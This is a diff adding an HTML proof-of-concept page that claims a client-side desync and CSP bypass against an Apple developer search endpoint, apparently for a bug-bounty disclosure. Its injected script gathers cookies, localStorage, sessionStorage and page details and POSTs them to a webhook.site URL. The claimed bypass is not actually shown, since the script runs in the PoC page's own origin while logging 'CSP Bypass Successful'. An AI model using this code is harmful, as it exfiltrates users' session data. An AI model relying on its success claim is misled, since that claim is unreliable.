@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Apple Developer CSD PoC</title>
+</head>
+<body>
+<h1>PoC - Client-Side Desync & CSP Bypass</h1>
+<p>هذا الاختبار مخصص لحسابي الشخصي فقط ضمن برنامج الإفصاح.</p>
+
+<script>
+    var targetUrl = "https://developer.apple.com/search/services/v1/quick-links/";
+    var webhookUrl = "https://webhook.site/6779eec5-8f34-4065-80c4-b471fe8c032b";
+
+    function cspBypass() {
+        var s = document.createElement('script');
+        s.innerHTML = `
+            console.log("✅ CSP Bypass Successful - Code Executed in Target Context");
+            document.body.style.background = '#ffcccc';
+            document.body.insertAdjacentHTML('beforeend', '<h2>Injected Script Executed!</h2>');
+
+            // بيانات الجلسة (خاصة بحسابي فقط أثناء الاختبار)
+            var data = {
+                cookies: document.cookie,
+                localStorage: localStorage,
+                sessionStorage: sessionStorage,
+                location: location.href,
+                userAgent: navigator.userAgent,
+                proof: "Test on my account only for disclosure program"
+            };
+
+            // إرسال البيانات إلى Webhook
+            fetch("${webhookUrl}", {
+                method: "POST",
+                mode: "no-cors",
+                body: JSON.stringify(data)
+            });
+        `;
+        document.body.appendChild(s);
+    }
+
+    fetch(targetUrl, { credentials: "include" })
+        .then(response => response.text())
+        .then(html => {
+            console.log("📄 Vulnerable page fetched, injecting code...");
+            cspBypass();
+        })
+        .catch(err => console.error("❌ Error fetching target:", err));
+</script>
+</body>
+</html>
